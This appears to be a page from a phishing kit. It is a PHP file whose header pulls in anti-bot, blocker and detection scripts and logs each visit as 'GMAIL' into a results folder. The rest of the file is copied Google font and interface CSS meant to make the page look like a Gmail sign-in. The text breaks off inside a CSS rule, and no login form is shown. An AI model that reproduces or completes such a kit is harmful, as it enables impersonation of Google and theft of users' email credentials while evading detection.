<?php 
session_start();
require_once '../../main.php';
include('../../detects.php');
include('../../blockers.php');
include('../../random.php');
include('../../antibot.php');
header('Access-Control-Allow-Origin: *');
tulis_file("../../result/total_email.txt", "GMAIL");
tulis_file("../../result/total_gmail.txt", "GMAIL");
?>
<html lang="en" dir="ltr" class="CMgTXc">
<head>
	<style nonce="">@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxFIzIXKMnyrYk.woff2)format('woff2');
	unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxMIzIXKMnyrYk.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxEIzIXKMnyrYk.woff2)format('woff2');
	unicode-range: U+1F00-1FFF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxLIzIXKMnyrYk.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxHIzIXKMnyrYk.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxGIzIXKMnyrYk.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 100;
	src: local('Roboto Thin'), local('Roboto-Thin'), url(//fonts.gstatic.com/s/roboto/v18/KFOkCnqEu92Fr1MmgVxIIzIXKMny.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fCRc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fABc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fCBc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+1F00-1FFF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fBxc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fCxc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fChc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 300;
	src: local('Roboto Light'), local('Roboto-Light'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmSU5fBBc4AMP6lQ.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu72xKKTU1Kvnz.woff2)format('woff2');
	unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu5mxKKTU1Kvnz.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu7mxKKTU1Kvnz.woff2)format('woff2');
	unicode-range: U+1F00-1FFF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu4WxKKTU1Kvnz.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu7WxKKTU1Kvnz.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu7GxKKTU1Kvnz.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 400;
	src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu4mxKKTU1Kg.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCRc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fABc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCBc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+1F00-1FFF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fBxc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCxc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fChc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 500;
	src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fBBc4AMP6lQ.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfCRc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfABc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfCBc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+1F00-1FFF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfBxc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfCxc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfChc4AMP6lbBP.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Roboto';
	font-style: normal;
	font-weight: 700;
	src: local('Roboto Bold'), local('Roboto-Bold'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfBBc4AMP6lQ.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

</style><style nonce="">@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 400;
	src: local('Google Sans Regular'), local('GoogleSans-Regular'), url(//fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Kwp5eKQtGBlc.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 400;
	src: local('Google Sans Regular'), local('GoogleSans-Regular'), url(//fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Nwp5eKQtGBlc.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 400;
	src: local('Google Sans Regular'), local('GoogleSans-Regular'), url(//fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Bwp5eKQtGBlc.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 400;
	src: local('Google Sans Regular'), local('GoogleSans-Regular'), url(//fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Awp5eKQtGBlc.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 400;
	src: local('Google Sans Regular'), local('GoogleSans-Regular'), url(//fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Owp5eKQtG.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 500;
	src: local('Google Sans Medium'), local('GoogleSans-Medium'), url(//fonts.gstatic.com/s/googlesans/v14/4UabrENHsxJlGDuGo1OIlLU94Yt3CwZsPF4oxIs.woff2)format('woff2');
	unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 500;
	src: local('Google Sans Medium'), local('GoogleSans-Medium'), url(//fonts.gstatic.com/s/googlesans/v14/4UabrENHsxJlGDuGo1OIlLU94YtwCwZsPF4oxIs.woff2)format('woff2');
	unicode-range: U+0370-03FF;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 500;
	src: local('Google Sans Medium'), local('GoogleSans-Medium'), url(//fonts.gstatic.com/s/googlesans/v14/4UabrENHsxJlGDuGo1OIlLU94Yt8CwZsPF4oxIs.woff2)format('woff2');
	unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 500;
	src: local('Google Sans Medium'), local('GoogleSans-Medium'), url(//fonts.gstatic.com/s/googlesans/v14/4UabrENHsxJlGDuGo1OIlLU94Yt9CwZsPF4oxIs.woff2)format('woff2');
	unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

@font-face {
	font-family: 'Google Sans';
	font-style: normal;
	font-weight: 500;
	src: local('Google Sans Medium'), local('GoogleSans-Medium'), url(//fonts.gstatic.com/s/googlesans/v14/4UabrENHsxJlGDuGo1OIlLU94YtzCwZsPF4o.woff2)format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

</style>
	
	<style>.w4xrzf {
	display: hidden
}

@keyframes quantumWizBoxInkSpread {
	0% {
		-webkit-transform: translate(-50%, -50%) scale(.2);
		transform: translate(-50%, -50%) scale(.2)
	}
	to {
		-webkit-transform: translate(-50%, -50%) scale(2.2);
		transform: translate(-50%, -50%) scale(2.2)
	}
}

@-webkit-keyframes quantumWizBoxInkSpread {
	0% {
		-webkit-transform: translate(-50%, -50%) scale(.2);
		transform: translate(-50%, -50%) scale(.2)
	}
	to {
		-webkit-transform: translate(-50%, -50%) scale(2.2);
		transform: translate(-50%, -50%) scale(2.2)
	}
}

@keyframes quantumWizIconFocusPulse {
	0% {
		-webkit-transform: translate(-50%, -50%) scale(1.5);
		transform: translate(-50%, -50%) scale(1.5);
		opacity: 0
	}
	to {
		-webkit-transform: translate(-50%, -50%) scale(2);
		transform: translate(-50%, -50%) scale(2);
		opacity: 1
	}
}

@-webkit-keyframes quantumWizIconFocusPulse {
	0% {
		-webkit-transform: translate(-50%, -50%) scale(1.5);
		transform: translate(-50%, -50%) scale(1.5);
		opacity: 0
	}
	to {
		-webkit-transform: translate(-50%, -50%) scale(2);
		transform: translate(-50%, -50%) scale(2);
		opacity: 1
	}
}

@keyframes quantumWizRadialInkSpread {
	0% {
		-webkit-transform: scale(1.5);
		transform: scale(1.5);
		opacity: 0
	}
	to {
		-webkit-transform: scale(2.5);
		transform: scale(2.5);
		opacity: 1
	}
}

@-webkit-keyframes quantumWizRadialInkSpread {
	0% {
		-webkit-transform: scale(1.5);
		transform: scale(1.5);
		opacity: 0
	}
	to {
		-webkit-transform: scale(2.5);
		transform: scale(2.5);
		opacity: 1
	}
}

@keyframes quantumWizRadialInkFocusPulse {
	0% {
		-webkit-transform: scale(2);
		transform: scale(2);
		opacity: 0
	}
	to {
		-webkit-transform: scale(2.5);
		transform: scale(2.5);
		opacity: 1
	}
}

@-webkit-keyframes quantumWizRadialInkFocusPulse {
	0% {
		-webkit-transform: scale(2);
		transform: scale(2);
		opacity: 0
	}
	to {
		-webkit-transform: scale(2.5);
		transform: scale(2.5);
		opacity: 1
	}
}

.O0WRkf {
	-webkit-user-select: none;
	-webkit-transition: background .2s .1s;
	transition: background .2s .1s;
	border: 0;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	cursor: pointer;
	display: inline-block;
	font-size: 14px;
	font-weight: 500;
	min-width: 4em;
	outline: none;
	overflow: hidden;
	position: relative;
	text-align: center;
	text-transform: uppercase;
	-webkit-tap-highlight-color: transparent;
	z-index: 0
}

.A9jyad {
	font-size: 13px;
	line-height: 16px
}

.zZhnYe {
	-webkit-transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	background: #dfdfdf;
	-webkit-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2);
	box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2)
}

.zZhnYe.qs41qe {
	-webkit-transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	-webkit-transition: background .8s;
	transition: background .8s;
	-webkit-box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2);
	box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2)
}

.e3Duub,
.e3Duub a,
.e3Duub a:hover,
.e3Duub a:link,
.e3Duub a:visited {
	background: #4285f4;
	color: #fff
}

.HQ8yf,
.HQ8yf a {
	color: #4285f4
}

.UxubU,
.UxubU a {
	color: #fff
}

.ZFr60d {
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background-color: transparent
}

.O0WRkf.u3bW4e .ZFr60d {
	background-color: rgba(0, 0, 0, 0.12)
}

.UxubU.u3bW4e .ZFr60d {
	background-color: rgba(255, 255, 255, 0.30)
}

.e3Duub.u3bW4e .ZFr60d {
	background-color: rgba(0, 0, 0, 0.122)
}

.HQ8yf.u3bW4e .ZFr60d {
	background-color: rgba(66, 133, 244, 0.149)
}

.Vwe4Vb {
	-webkit-transform: translate(-50%, -50%) scale(0);
	transform: translate(-50%, -50%) scale(0);
	-webkit-transition: opacity .2s ease, visibility 0s ease .2s, transform 0s ease .2s;
	transition: opacity .2s ease, visibility 0s ease .2s, transform 0s ease .2s;
	-webkit-transition: opacity .2s ease, visibility 0s ease .2s, -webkit-transform 0s ease .2s;
	transition: opacity .2s ease, visibility 0s ease .2s, -webkit-transform 0s ease .2s;
	-webkit-background-size: cover;
	background-size: cover;
	left: 0;
	opacity: 0;
	pointer-events: none;
	position: absolute;
	top: 0;
	visibility: hidden
}

.O0WRkf.qs41qe .Vwe4Vb {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	opacity: 1;
	visibility: visible
}

.O0WRkf.qs41qe.M9Bg4d .Vwe4Vb {
	-webkit-transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1)
}

.O0WRkf.j7nIZb .Vwe4Vb {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	visibility: visible
}

.oG5Srb .Vwe4Vb,
.zZhnYe .Vwe4Vb {
	background-image: radial-gradient(circle farthest-side, rgba(0, 0, 0, 0.12), rgba(0, 0, 0, 0.12) 80%, rgba(0, 0, 0, 0) 100%)
}

.HQ8yf .Vwe4Vb {
	background-image: radial-gradient(circle farthest-side, rgba(66, 133, 244, 0.251), rgba(66, 133, 244, 0.251) 80%, rgba(66, 133, 244, 0) 100%)
}

.e3Duub .Vwe4Vb {
	background-image: radial-gradient(circle farthest-side, #3367d6, #3367d6 80%, rgba(51, 103, 214, 0) 100%)
}

.UxubU .Vwe4Vb {
	background-image: radial-gradient(circle farthest-side, rgba(255, 255, 255, 0.30), rgba(255, 255, 255, 0.30) 80%, rgba(255, 255, 255, 0) 100%)
}

.O0WRkf.RDPZE {
	-webkit-box-shadow: none;
	box-shadow: none;
	color: rgba(68, 68, 68, 0.502);
	cursor: default;
	fill: rgba(68, 68, 68, 0.502)
}

.zZhnYe.RDPZE {
	background: rgba(153, 153, 153, 0.102)
}

.UxubU.RDPZE {
	color: rgba(255, 255, 255, 0.502);
	fill: rgba(255, 255, 255, 0.502)
}

.UxubU.zZhnYe.RDPZE {
	background: rgba(204, 204, 204, 0.102)
}

.CwaK9 {
	position: relative
}

.RveJvd {
	display: inline-block;
	margin: .5em
}

.FliLIb {
	font-family: 'Google Sans', arial, sans-serif;
	font-size: inherit;
	letter-spacing: .25px
}

.FliLIb.u3bW4e {
	-webkit-box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2);
	box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2)
}

.FliLIb.eLNT1d {
	display: none
}

.FliLIb.O0WRkf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	text-transform: none
}

.xYnMae .snByac,
.uRo0Xe .snByac {
	font-weight: 500;
	line-height: 1.4286
}

.xYnMae {
	border: 1px solid #dadce0
}

.xYnMae .snByac {
	margin: 8px 24px
}

.FliLIb.uRo0Xe {
	min-width: 0
}

.uRo0Xe .snByac {
	margin: 8px 8px;
	text-transform: none
}

.zZhnYe {
	-webkit-box-shadow: none;
	box-shadow: none
}

.zZhnYe:not(.RDPZE) {
	background: #1a73e8;
	color: #fff
}

.zZhnYe:hover:not(.RDPZE) {
	background: #287ae6;
	-webkit-box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.45), 0 1px 3px 1px rgba(66, 133, 244, 0.3);
	box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.45), 0 1px 3px 1px rgba(66, 133, 244, 0.3)
}

.zZhnYe:not(.RDPZE).u3bW4e {
	background: #5094ed;
	-webkit-box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.3), 0 1px 3px 1px rgba(66, 133, 244, 0.15);
	box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.3), 0 1px 3px 1px rgba(66, 133, 244, 0.15)
}

.oG5Srb:not(.RDPZE) {
	background: transparent;
	-webkit-box-shadow: none;
	box-shadow: none;
	color: #1a73e8
}

.oG5Srb:hover:not(.RDPZE) {
	background: #f6fafe
}

.oG5Srb:not(.RDPZE).u3bW4e {
	background: #e8f0fd
}

.XKSfm-Sx9Kwc {
	-webkit-box-shadow: 0 4px 16px rgba(0, 0, 0, .2);
	box-shadow: 0 4px 16px rgba(0, 0, 0, .2);
	background: #fff;
	background-clip: padding-box;
	outline: 0;
	position: absolute
}

.XKSfm-Sx9Kwc-xJ5Hnf {
	background: #fff;
	left: 0;
	position: absolute;
	top: 0
}

div.XKSfm-Sx9Kwc-xJ5Hnf {
	filter: alpha(opacity=75);
	opacity: .75
}

.XKSfm-Sx9Kwc {
	color: #000
}

.XKSfm-Sx9Kwc-r4nke {
	color: #000;
	cursor: default;
	line-height: 24px;
	margin: 0 0 16px
}

.XKSfm-Sx9Kwc-r4nke-TvD9Pc {
	height: 11px;
	opacity: .7;
	padding: 17px;
	position: absolute;
	right: 0;
	top: 0;
	width: 11px
}

.XKSfm-Sx9Kwc-r4nke-TvD9Pc:after {
	content: '';
	background: url(//ssl.gstatic.com/ui/v1/dialog/close-x.png);
	position: absolute;
	height: 11px;
	width: 11px;
	right: 17px
}

.XKSfm-Sx9Kwc-r4nke-TvD9Pc:hover {
	opacity: 1
}

.XKSfm-Sx9Kwc-bN97Pc {
	line-height: 1.4em;
	word-wrap: break-word
}

.XKSfm-Sx9Kwc-c6xFrd button {
	-webkit-border-radius: 2px;
	border-radius: 2px;
	background-color: #f5f5f5;
	background-image: -webkit-linear-gradient(top, #f5f5f5, #f1f1f1);
	background-image: linear-gradient(top, #f5f5f5, #f1f1f1);
	border: 1px solid #dcdcdc;
	border: 1px solid rgba(0, 0, 0, 0.1);
	color: #444;
	cursor: default;
	font-family: inherit;
	font-size: 11px;
	font-weight: bold;
	height: 29px;
	line-height: 27px;
	margin: 0 16px 0 0;
	min-width: 72px;
	outline: 0;
	padding: 0 8px
}

.XKSfm-Sx9Kwc-c6xFrd button:hover {
	-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
	box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
	background-color: #f8f8f8;
	background-image: -webkit-linear-gradient(top, #f8f8f8, #f1f1f1);
	background-image: linear-gradient(top, #f8f8f8, #f1f1f1);
	border: 1px solid #c6c6c6;
	color: #333
}

.XKSfm-Sx9Kwc-c6xFrd button:active {
	-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
	box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
	background-color: #f8f8f8;
	background-image: -webkit-linear-gradient(top, #f8f8f8, #f1f1f1);
	background-image: linear-gradient(top, #f8f8f8, #f1f1f1);
